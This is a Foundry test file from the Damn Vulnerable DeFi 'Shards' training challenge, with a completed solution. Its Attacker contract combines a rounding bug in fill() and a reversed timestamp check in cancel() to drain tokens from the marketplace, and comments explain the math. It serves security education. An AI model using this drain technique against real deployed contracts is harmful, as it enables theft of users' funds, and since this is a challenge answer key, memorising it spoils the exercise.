// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";

contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address seller = makeAddr("seller");
    address oracle = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    DamnValuableToken token;
    DamnValuableNFT nft;
    ShardsFeeVault feeVault;
    ShardsNFTMarketplace marketplace;
    DamnValuableStaking staking;

    uint256 initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy NFT contract and mint initial supply
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) {
                nft.safeMint(seller);
            } else {
                nft.safeMint(deployer);
            }
        }

        // Deploy token (used for payments and fees)
        token = new DamnValuableToken();

        // Deploy NFT marketplace and get the associated fee vault
        marketplace =
            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
        feeVault = marketplace.feeVault();

        // Deploy DVT staking contract and enable staking of fees in marketplace
        staking = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);

        // Fund seller with DVT (to cover fees)
        token.transfer(seller, SELLER_DVT_BALANCE);

        // Seller opens offers in the marketplace
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE); // for fees
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }

        initialTokensInMarketplace = token.balanceOf(address(marketplace));

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(feeVault.owner(), deployer);
        assertEq(address(feeVault.token()), address(token));
        assertEq(address(feeVault.staking()), address(staking));

        assertEq(nft.balanceOf(deployer), NFT_SUPPLY - SELLER_NFT_BALANCE);
        assertEq(nft.balanceOf(address(marketplace)), marketplace.offerCount());
        assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
        assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
        assertGt(marketplace.feesInBalance(), 0);
        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());

        assertEq(staking.rate(), STAKING_RATE);
        assertEq(staking.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS);
        assertEq(token.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_shards() public checkSolvedByPlayer {
        new Attacker(AttackData({
            MARKETPLACE_INITIAL_RATE: MARKETPLACE_INITIAL_RATE,
            marketplace: marketplace,
            token: token,
            player: player,
            recovery: recovery
        })).attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Balance of staking contract didn't change
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

        // Marketplace has less tokens
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

        // All recovered funds sent to recovery account
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1);
    }
}

struct AttackData {
    uint256 MARKETPLACE_INITIAL_RATE;
    ShardsNFTMarketplace marketplace;
    DamnValuableToken token;
    address player;
    address recovery;
}

contract Attacker {
    AttackData private $;

    constructor(AttackData memory attackData) {
        $ = attackData;
    }

    function attack() external {
        // Recall that we don't have any DVT.
        // ShardsNFTMarketplace::fill() will work as long as it has to transfer
        // less than 1 DVT (as in 1 wei, not 1e18).
        // To accomplish that, we solve
        //   want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards) < 1
        //   want < (offer.totalShards * 1e6) / (offer.price * _currentRate) ≈ 133.33
        //   want = 133.
        uint256 purchaseIndex = $.marketplace.fill(1, 133);

        // Here, we exploit a bug in ShardsNFTMarketplace::cancel().
        // The condition:
        //   block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL
        // is incorrect; the comparison sign is reversed. The intended condition is:
        //   block.timestamp < purchase.timestamp + TIME_BEFORE_CANCEL
        // This logic enforces:
        //   block.timestamp - purchase.timestamp < TIME_BEFORE_CANCEL
        // meaning, "If the difference between the current time and the purchase time
        // is less than TIME_BEFORE_CANCEL, the cancel attempt will fail."
        //
        // For example: If the purchase was made at timestamp 1, and the current
        // block timestamp is 100, with TIME_BEFORE_CANCEL set to 1000, the cancel
        // will fail because the cancel is only valid when the current timestamp
        // reaches or exceeds 1001.
        //
        // Due to the reversed logic in the bug, we can issue a cancellation
        // immediately after completing a purchase.
        $.marketplace.cancel(1, purchaseIndex);

        // Not only the bug mentioned above, but there is a bug in the conversion,
        // where we get `purchase.shards.mulDivUp(purchase.rate, 1e6)` DVT (the result is 9.975e12).
        uint256 amountDVTFirstPurchase =
            FixedPointMathLib.mulDivDown(
                133,
                $.MARKETPLACE_INITIAL_RATE,
                1e6
            );

        // We repeat this process to drain the marketplace.
        // First, we compute the number of shards needed to acquire the remaining DVT balance from the marketplace.
        // The formula for calculating the required shards is:
        //   purchase.shards.mulDivUp(purchase.rate, 1e6) = token.balanceOf(address(marketplace)) - amountDVTFirstPurchase
        // or equivalently:
        //   (purchase.shards * purchase.rate) / 1e6 = token.balanceOf(address(marketplace)) - amountDVTFirstPurchase
        // Solving for purchase.shards gives:
        //   purchase.shards = ((token.balanceOf(address(marketplace)) - amountDVTFirstPurchase) * 1e6) / purchase.rate
        uint256 amountShardsSecondPurchase =
            FixedPointMathLib.mulDivDown(
                ($.token.balanceOf(address($.marketplace)) - amountDVTFirstPurchase),
                1e6,
                $.MARKETPLACE_INITIAL_RATE
            );
        $.token.approve(address($.marketplace), amountDVTFirstPurchase);
        purchaseIndex = $.marketplace.fill(1, amountShardsSecondPurchase);
        $.marketplace.cancel(1, purchaseIndex);

        // Send the balance to the recovery account
        $.token.transfer($.recovery, $.token.balanceOf(address(this)));
    }
}
